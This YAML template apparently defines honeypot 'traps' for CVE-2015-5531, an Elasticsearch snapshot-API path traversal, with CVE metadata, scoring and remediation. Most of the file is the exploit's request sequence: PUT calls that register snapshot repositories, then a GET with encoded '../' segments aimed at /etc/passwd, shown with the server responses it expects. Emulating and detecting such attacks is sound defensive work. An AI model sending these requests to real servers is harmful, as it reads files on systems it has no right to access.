id: CVE-2015-5531
info:
  name: ElasticSearch <1.6.1 - Local File Inclusion
  author: princechaddha
  description: ElasticSearch before 1.6.1 allows remote attackers to read arbitrary
    files via unspecified vectors related to snapshot API calls.
  severity: medium
  impact: 'Successful exploitation of this vulnerability allows an attacker to read
    arbitrary files on the server, potentially leading to unauthorized access or sensitive
    information disclosure.

    '
  remediation: 'Upgrade ElasticSearch to version 1.6.1 or later to mitigate the vulnerability.

    '
  reference:
  - https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531
  - https://nvd.nist.gov/vuln/detail/CVE-2015-5531
  - http://packetstormsecurity.com/files/132721/Elasticsearch-Directory-Traversal.html
  - https://www.elastic.co/community/security/
  - http://packetstormsecurity.com/files/133797/ElasticSearch-Path-Traversal-Arbitrary-File-Download.html
  classification:
    cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N
    cvss-score: 5
    cve-id: CVE-2015-5531
    cwe-id: CWE-22
    epss-score: 0.97144
    epss-percentile: 0.99783
    cpe: cpe:2.3:a:elasticsearch:elasticsearch:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: elasticsearch
    product: elasticsearch
  tags: cve2015,cve,vulhub,packetstorm,elasticsearch,intrusive
traps:
- request:
    method: PUT
    path: /_snapshot/test
    headers: {}
    body: |
      {
          "type": "fs",
          "settings": {
              "location": "/usr/share/elasticsearch/repo/test"
          }
      }
  response:
    status_code: 400
    headers: {}
    body: ElasticsearchParseExceptionFailed to derive xcontent from114, 111, 111,
      116, 58
- request:
    method: PUT
    path: /_snapshot/test2
    headers: {}
    body: |
      {
          "type": "fs",
          "settings": {
              "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
          }
      }
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
